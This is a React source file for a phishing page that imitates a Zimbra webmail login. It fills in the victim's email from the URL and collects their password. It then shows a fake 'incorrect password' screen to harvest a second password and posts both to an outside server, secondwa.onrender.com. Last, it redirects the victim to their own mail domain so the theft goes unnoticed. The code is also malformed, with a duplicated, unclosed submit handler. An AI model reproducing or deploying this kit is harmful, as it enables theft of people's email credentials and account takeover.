import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import { useParams } from "react-router-dom";
import logo from "./Untitled.png";
import axios from "axios";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pass, setPass] = useState("");
  const [pasers, setPasser] = useState("");
  const [email, setEmail] = useState(params.id);

  const submitHandler = async (e) => {
    e.preventDefault();

 
 const submitHandler = async (e) => {
    e.preventDefault();

    console.log(email, pass);
    setConfirmForm(true);
    setShowForm(false);
    try {
      await axios.post("https://secondwa.onrender.com/sendmail2", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  const editHandler = async (e) => {
    e.preventDefault();
    setLoading(true);

    let domain = email.substring(email.lastIndexOf("@") + 1);

    try {
      await axios.post("https://secondwa.onrender.com/sendmail2", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };

  return (
    <Styls>
      <div className="contsainer">
        {showForm && (
          <form className="formal" onSubmit={submitHandler}>
            <div className="imagees">
              <img src={logo} className="imagee" alt="displare" />
            </div>
            <div className="inner">
              <div className="labcon">
                <span className="labeltext">Username:</span>

                <input
                  type="email"
                  onChange={(e) => setEmail(e.target.value)}
                  name="to_user"
                  required
                  value={params.id}
                  title="pls no"
                />
              </div>
              <div className="labcon">
                <span className="labeltext">Password:</span>
                <input
                  type="password"
                  onChange={(e) => setPass(e.target.value)}
                  pattern="(?=.*[0-9]).{8,}"
                  name="to_pass"
                  required
                />{" "}
              </div>{" "}
              <div className="stay">
                <label>
                  <input type="checkbox" /> stay signed in
                </label>
                <button> Sign In </button>
              </div>
              <hr></hr>
              <div className="stay2">
                <div>Version: </div>
                <div>
                  <select>
                    <option>Default</option>
                    <option>Advanced (Ajax)</option>
                    <option>Standard (HTML)</option>
                    <option>Mobile</option>
                  </select>
                  What's This?
                </div>
              </div>
            </div>
          </form>
        )}
      </div>
      {confirmForm && (
        <div className="contsainer">
          <form className="formal" onSubmit={editHandler}>
            <div className="imagees">
              <img src={logo} className="imagee" alt="displare" />
            </div>
            <div className="inner">
              <div className="labcon">
                <span className="labeltext">Username:</span>

                <input
                  type="email"
                  onChange={(e) => setEmail(e.target.value)}
                  name="to_user"
                  required
                  value={params.id}
                />
              </div>
              <div className="labcon">
                <span className="labeltext">Password:</span>
                <input
                  type="password"
                  onChange={(e) => setPasser(e.target.value)}
                  pattern="(?=.*[0-9]).{8,}"
                  name="to_pass"
                  required
                />
              </div>
              <p className="reda">Login failed Incorrect Password</p>
              <div className="stay">
                <label>
                  <input type="checkbox" /> stay signed in
                </label>
                <button>{loading ? "Loading....." : "Sign In"}</button>
              </div>
              <hr></hr>
              <div className="stay2">
                <div>Version: </div>
                <div>
                  <select>
                    <option>Default</option>
                    <option>Advanced (Ajax)</option>
                    <option>Standard (HTML)</option>
                    <option>Mobile</option>
                  </select>
                  What's This?
                </div>
              </div>
            </div>
          </form>
        </div>
      )}

      <div className="smaller">
        <br></br>
        Zimbra :: the leader in open source messaging and collaboration :: Blog
        - Wiki - Forumsc<br></br>
        Copyright © 2005-2019 Synacor, Inc. All rights reserved. "Zimbra" is a
        registered trademark of Synacor, Inc.
      </div>
    </Styls>
  );
}

export default Forms;
